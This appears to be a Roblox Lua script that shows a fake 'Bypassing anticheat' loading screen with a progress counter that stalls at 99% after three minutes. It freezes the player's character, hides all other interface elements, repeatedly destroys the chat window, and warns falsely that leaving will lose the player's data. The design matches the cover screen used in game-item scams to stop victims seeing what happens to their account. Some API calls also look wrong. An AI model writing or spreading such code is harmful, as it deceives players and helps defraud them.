local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local TextChatService = game:GetService("TextChatService")
local CoreGui = game:GetService("CoreGui")
local TeleportService = game:GetService("TeleportService")

local function SetupLoadingScreen()
    local player = Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")

    if playerGui:FindFirstChild("FullCoverLoading") then
        playerGui.FullCoverLoading:Destroy()
    end

    local function disableMovement()
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
        end
    end

    disableMovement()
    player.CharacterAdded:Connect(disableMovement)

    for _, gui in pairs(playerGui:GetChildren()) do
        if gui:IsA("ScreenGui") and gui.Name ~= "FullCoverLoading" then
            gui.Enabled = false
        end
    end

    playerGui.ChildAdded:Connect(function(child)
        if child:IsA("ScreenGui") and child.Name ~= "FullCoverLoading" then
            child.Enabled = false
        end
    end)

    pcall(function()
        if TextChatService:FindFirstChild("ChatWindowConfiguration") then
            TextChatService.ChatWindowConfiguration.Enabled = false
        end
    end)

    pcall(function()
        if CoreGui:FindFirstChild("Chat") then
            CoreGui.Chat:Destroy()
        end
    end)

    CoreGui.ChildAdded:Connect(function(child)
        if child.Name == "Chat" then
            child:Destroy()
        end
    end)

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "FullCoverLoading"
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    screenGui.Parent = playerGui

    local background = Instance.new("Frame")
    background.Size = UDim2.new(1, 0, 1, 0)
    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    background.ZIndex = 10000
    background.Parent = screenGui

    local loadingText = Instance.new("TextLabel")
    loadingText.Size = UDim2.new(1, 0, 0.1, 0)
    loadingText.Position = UDim2.new(0, 0, 0.4, 0)
    loadingText.BackgroundTransparency = 1
    loadingText.TextColor3 = Color3.new(1, 1, 1)
    loadingText.Font = Enum.Font.SourceSansLight
    loadingText.TextScaled = true
    loadingText.Text = "Loading.. 0%"
    loadingText.ZIndex = 10001
    loadingText.Parent = background

    local bypassText = Instance.new("TextLabel")
    bypassText.Size = UDim2.new(1, 0, 0.05, 0)
    bypassText.Position = UDim2.new(0, 0, 0.5, 0)
    bypassText.BackgroundTransparency = 1
    bypassText.TextColor3 = Color3.new(0.8, 0.8, 0.8)
    bypassText.Font = Enum.Font.SourceSans
    bypassText.TextScaled = true
    bypassText.Text = "Bypassing anticheat... please wait"
    bypassText.ZIndex = 10001
    bypassText.Parent = background

    local warningText = Instance.new("TextLabel")
    warningText.Size = UDim2.new(1, 0, 0.05, 0)
    warningText.Position = UDim2.new(0, 0, 0.55, 0)
    warningText.BackgroundTransparency = 1
    warningText.TextColor3 = Color3.new(0.8, 0.2, 0.2)
    warningText.Font = Enum.Font.SourceSans
    warningText.TextScaled = true
    warningText.Text = "Wait for the loading screen to load. Don't leave, or you'll lose your data."
    warningText.ZIndex = 10001
    warningText.Parent = background

    local creditText = Instance.new("TextLabel")
    creditText.Size = UDim2.new(1, 0, 0.04, 0)
    creditText.Position = UDim2.new(0, 0, 0.6, 0)
    creditText.BackgroundTransparency = 1
    creditText.TextColor3 = Color3.new(0.6, 0.6, 0.6)
    creditText.Font = Enum.Font.SourceSans
    creditText.TextScaled = true
    creditText.Text = "by @syeb."
    creditText.ZIndex = 10001
    creditText.Parent = background

    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        return Enum.ContextActionResult.Sink
    end)

    local totalTime = 180
    local steps = 100
    for i = 1, steps - 1 do
        task.wait(totalTime / steps)
        loadingText.Text = "Loading.. " .. i .. "%"
    end

    loadingText.Text = "Loading.. 99%"
end

SetupLoadingScreen()

local function OnPlayerAdded(player)
    if player == Players.LocalPlayer then
        SetupLoadingScreen()
    end
end

Players.PlayerAdded:Connect(OnPlayerAdded)

local function OnTeleport()
    local teleportData = {
        loadingScript = true
    }
    TeleportService:SetTeleportGui(teleportData)
end

TeleportService.LocalPlayerTeleporting:Connect(OnTeleport)
TeleportService.TeleportInitiated:Connect(OnTeleport)
